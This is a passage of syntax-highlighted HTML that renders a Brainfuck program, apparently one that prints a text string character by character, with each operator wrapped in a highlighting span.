operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span 